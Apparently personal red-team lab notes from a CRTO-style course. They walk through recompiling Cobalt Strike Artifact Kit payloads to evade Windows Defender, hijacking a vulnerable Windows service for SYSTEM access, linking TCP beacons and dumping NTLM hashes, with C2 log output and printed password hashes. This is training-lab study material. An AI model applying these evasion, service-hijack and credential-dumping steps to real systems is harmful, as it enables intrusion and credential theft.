[Artifact kit] [*] Recompile artifact32svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svc.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.x64.dll with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64big.exe with src-common/bypass-pipe.c
[Artifact kit] [*] Recompile artifact64svcbig.exe with src-common/bypass-pipe.c
[Artifact kit] [+] The artifacts for the bypass technique 'pipe' are saved in '/mnt/c/Tools/cobaltstrike/artifacts/pipe'
```
run `ThreatCheck.exe` against a new artifact `C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe`
Success!
```bash
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe
[+] No threat found!
[*] Run time: 0.83s
```
load new aggressor script into `Cobalt Strike` 

![[Pasted image 20231107130421.png]]
once loaded generate new payloads via `Payloads -> Windows Stageless Generate All Payloads` 
![[Pasted image 20231107131604.png]]
save to `C:\Payloads`
![[Pasted image 20231107131639.png]]
navigate to `http://10.10.5.50:80/b.exe`

Windows defender bypassed, hit `run`  and should be good to go.
![[Pasted image 20231107132050.png]]
made a copy of and renamed `tcp-localonly_x64.exe` to `Service.exe`
![[Pasted image 20231107135605.png]]
uploaded file through `cobaltstrike`
![[Pasted image 20231107135821.png]]
ran `run sc query VulnService1` to see if the service is stoppable
```powershell
[11/07 18:59:03] [*] Tasked beacon to run: sc query VulnService1
[11/07 18:59:03] [+] host called home, sent: 39 bytes
[11/07 18:59:03] [+] received output:

SERVICE_NAME: VulnService1 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```
going to reboot the device `shell shutdown /r` in cobaltstrike
![[Pasted image 20231107140120.png]]
# System Privilege Escalation.
able to catch the beacon as  SYSTEM while utilizing the `tcp-localonly_x64.exe` however it dies almost immediately , was still able to dump hashes. Updating the [[Penetration Testing v2/crto_Defender/access_Tracker]]
- access tracker updated.

*essentially whats going on is the system was restarted and the `VulnService1` was in a `STOPPED` state.*
started the service by using the command `run sc start VulnService1`
```powershell
[11/07 19:38:42] beacon> run sc query VulnService1
[11/07 19:38:43] [*] Tasked beacon to run: sc query VulnService1
[11/07 19:38:43] [+] host called home, sent: 39 bytes
[11/07 19:38:43] [+] received output:

SERVICE_NAME: VulnService1 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
```
ran `run netstat -anp tcp` to check to see if the beacon port is running, it was on `4444`
```powershell
[11/07 19:55:04] beacon> run netstat -anp tcp
[11/07 19:55:04] [*] Tasked beacon to run: netstat -anp tcp
[11/07 19:55:06] [+] host called home, sent: 34 bytes
[11/07 19:55:06] [+] received output:

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:61832          0.0.0.0:0              LISTENING
  TCP    10.10.123.102:139      0.0.0.0:0              LISTENING
  TCP    10.10.123.102:3389     10.10.255.244:47190    ESTABLISHED
  TCP    10.10.123.102:61767    10.10.120.100:8220     ESTABLISHED
  TCP    10.10.123.102:61801    10.10.120.100:9200     ESTABLISHED
  TCP    10.10.123.102:61805    10.10.120.100:9200     ESTABLISHED
  TCP    10.10.123.102:61989    10.10.122.254:3128     CLOSE_WAIT
  TCP    10.10.123.102:62082    10.10.120.30:80        ESTABLISHED
  TCP    10.10.123.102:62410    10.10.122.254:3128     ESTABLISHED
  TCP    10.10.123.102:62420    10.10.120.100:9200     TIME_WAIT
  TCP    10.10.123.102:62469    10.10.120.100:9200     ESTABLISHED
																																  TCP    127.0.0.1:4444         0.0.0.0:0              LISTENING
  TCP    127.0.0.1:6788         0.0.0.0:0              LISTENING
  TCP    127.0.0.1:6789         0.0.0.0:0              LISTENING
  TCP    127.0.0.1:6789         127.0.0.1:61766        ESTABLISHED
  TCP    127.0.0.1:6789         127.0.0.1:61799        ESTABLISHED
  TCP    127.0.0.1:6789         127.0.0.1:61800        ESTABLISHED
  TCP    127.0.0.1:61766        127.0.0.1:6789         ESTABLISHED
  TCP    127.0.0.1:61799        127.0.0.1:6789         ESTABLISHED
  TCP    127.0.0.1:61800        127.0.0.1:6789         ESTABLISHED
  TCP    127.0.0.1:62045        0.0.0.0:0              LISTENING
```
quickly `connect localhost 4444`
*the service is able to connect then dies*
```powershell
[11/07 19:40:08] beacon> connect localhost 4444
[11/07 19:40:08] [*] Tasked to connect to localhost:4444
[11/07 19:40:15] [+] host called home, sent: 20 bytes
[11/07 19:40:15] [+] established link to child beacon: 10.10.123.102
[11/07 19:40:35] [-] lost link to child beacon: 10.10.123.102
[11/07 19:40:35] [+] received output:
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```
quickly ran `whoami` & `hashdump` before losing link.
```powershell
[11/07 19:39:13] beacon> shell whoami
[11/07 19:39:13] [*] Tasked beacon to run: whoami
[11/07 19:39:13] [+] host called home, sent: 37 bytes
[11/07 19:39:13] [+] received output:
nt authority\system
```

```powershell
[11/07 19:40:22] beacon> hashdump
[11/07 19:40:22] [*] Tasked beacon to dump hashes
[11/07 19:40:22] [+] host called home, sent: 83262 bytes
[11/07 19:40:24] [+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
LapsAdmin:1001:aad3b435b51404eeaad3b435b51404ee:cd984ea98ca4ac9593de417bb68aa3a7:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:8710fb3e12ffb120dfee7b68eac878d2:::

[11/07 19:40:35] [-] lost link to parent beacon: 10.10.123.102
```
# Registry timeout modification
in windows start menu navigate to `regedit`
go to `Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`
add `ServicesPipeTimeout`
![[Pasted image 20231107151508.png]]
reset the machine and checked to see if the registry was saved. good to go.
![[Pasted image 20231107151911.png]]
caught the beacon and it stayed up for about 20 minutes before crashing again.
better but not perfect.
![[Pasted image 20231107155050.png]]
## tcp-localonly_x64.svc.exe

*The previous error was occuring due to running `tcp-localonly_x64.exe` instead of the service binary `tcp-localonly_x64.svc.exe`* 
copied the actual service binary with the name `Service.exe` to replace the last binary and executed the same method as before.

the service binary is running as rundll32.exe
![[Pasted image 20231107163005.png]]


proof that we're on
![[Pasted image 20231107155402.png]]